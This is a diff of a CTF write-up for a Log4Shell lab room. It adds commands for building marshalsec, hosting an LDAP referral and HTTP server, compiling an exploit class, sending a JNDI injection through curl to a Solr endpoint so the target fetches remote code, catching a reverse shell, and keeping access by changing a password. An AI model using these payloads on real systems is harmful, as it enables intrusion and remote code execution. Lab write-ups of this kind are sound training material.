@@ -1,4 +1,4 @@
-# Log4Shell THM Writeups
+<img width="663" height="165" alt="image" src="https://github.com/user-attachments/assets/dc5c5335-7f8c-4a9a-a8a8-d02c91fbf9ef" /># Log4Shell THM Writeups
 
 ## Reconnaissance
 
@@ -86,8 +86,103 @@ And I got the revshell
 
 ## Exploitation
 
+In the netcat response we can see that the returned data is not readable its because, we didn't use a LDAP server to communicate to the target we need a LDAP server 
+
+For that we can use marshalsec tool 
+
+Github repo: https://github.com/mbechler/marshalsec
+
+For building the marshalsec tool we need maven tool
+
+Use this command to do it 
+
+`sudo apt install maven`
+
+`mvn clean package -DskipTests`
 
 
+Also host a local python http server by using this command
+
+`python3 -m http.server`
+
+### Hosting the LDAP Server
+
+Command: 
+
+`java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.49.122.225:8000/#Exploit"`
+
+<img width="861" height="572" alt="image" src="https://github.com/user-attachments/assets/61ae4263-3d5b-4462-b317-ea641f7b363b" />
+
+### Crafting our Exploit
+
+
+<img width="889" height="235" alt="image" src="https://github.com/user-attachments/assets/ba3a1901-58e5-4f60-b7e3-7552e1a9fd31" />
+
+
+Execute the java file using this command which generates the class file.
+
+`javac Exploit.java -source 8 -target 8`
+
+Then python3 server should we running in the same place of the Exploit is there
+
+<img width="823" height="311" alt="image" src="https://github.com/user-attachments/assets/db69c335-1778-4ed5-9e9d-3284353de9fd" />
+
+
+And open a ncat listenert in port 9999
+
+<img width="542" height="161" alt="image" src="https://github.com/user-attachments/assets/c833a6a0-21eb-444e-8545-cf36c99a4524" />
+
+
+### Final Exploitation
+
+Command: 
+
+`curl 'http://10.49.145.26:8983/solr/admin/cores?foo=$\{jndi:ldap://10.49.122.225:1389/Exploit\}'`
+
+<img width="954" height="280" alt="image" src="https://github.com/user-attachments/assets/acc63de3-fd33-4959-b428-ec1daa435b84" />
+
+
+And getting revshell
+
+<img width="673" height="196" alt="image" src="https://github.com/user-attachments/assets/7883198c-0a68-43cb-8621-cb9eae923774" />
+
+
+## Persistence
+
+Spawning a shell
+
+Command:
+
+`python3 -c "import pty; pty.spawn('/bin/bash')"`
+
+<img width="663" height="165" alt="image" src="https://github.com/user-attachments/assets/fb0bc3b2-d295-438a-b21b-364922e73000" />
+
+Listing sudo permissions by 
+
+`sudo -l`
+
+<img width="961" height="204" alt="image" src="https://github.com/user-attachments/assets/cf36b68b-21c5-43e4-b747-7b59b832a929" />
+
+We can see that anybody can change the superuser password so lets change it 
+
+Changing the password of the machine
+
+<img width="636" height="203" alt="image" src="https://github.com/user-attachments/assets/5a1e1919-561f-4236-abc1-a368a52b71bb" />
+
+
+Connecting SSH with the changed password
+
+Command:
+
+`ssh solr@10.49.145.26`
+
+
+<img width="974" height="753" alt="image" src="https://github.com/user-attachments/assets/916df066-d865-490c-b28e-b87028c24c2f" />
+
+Successfully completed persistence
+
+
+## Detection
 
 
 
